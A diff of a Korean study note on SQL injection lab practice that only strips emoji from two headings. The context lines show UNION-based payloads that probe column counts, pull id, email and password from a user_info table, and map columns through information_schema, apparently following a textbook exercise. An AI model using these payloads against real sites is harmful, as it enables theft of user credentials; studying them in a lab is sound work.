@@ -92,7 +92,7 @@ name = %' UNION SELECT 1,2,3 #
 ```
 → `1, 2, 3` 한 행이 결과에 섞여 나오면 컬럼 수가 3으로 맞은 것이다.
 
-### 4-4. 🔥 UNION 기반 계정 정보 탈취
+### 4-4.  UNION 기반 계정 정보 탈취
 
 ```
 name = %' UNION SELECT id, email, password FROM user_info #
@@ -108,7 +108,7 @@ name = %' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE t
 ```
 → 공격자가 테이블·컬럼 구조를 알아내는 과정. (교재 219p 실습파일의 흐름과 동일)
 
-### ⚠️ 실습 함정 : 브라우저 주소창은 페이로드를 훼손한다
+###  실습 함정 : 브라우저 주소창은 페이로드를 훼손한다
 
 브라우저 주소창에 페이로드를 직접 넣으면 인젝션이 **실패**할 수 있다.
 
